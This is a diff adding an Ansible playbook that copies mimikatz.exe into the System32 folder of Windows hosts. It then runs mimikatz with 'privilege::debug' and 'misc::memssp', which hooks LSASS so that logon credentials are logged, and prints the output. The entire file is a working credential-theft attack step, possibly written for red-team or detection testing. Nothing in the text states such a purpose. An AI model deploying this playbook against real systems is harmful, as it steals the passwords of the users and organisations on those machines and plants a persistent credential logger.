@@ -1,0 +1,17 @@
+---
+- name: Execute Mimikatz via Ansible to hook LSASS and log
+  hosts: windows
+  gather_facts: yes
+  tasks:
+    - name: Copy mimikatz.exe to target
+      win_copy:
+        src: ../rsrc/mimikatz.exe
+        dest: C:\Windows\System32\mimikatz.exe
+
+    - name: Execute misc::memssp to hook LSASS and start logging
+      win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
+      register: memssp_output
+
+    - name: Show Execution Results
+      debug:
+        msg: "{{ memssp_output.stdout }}"
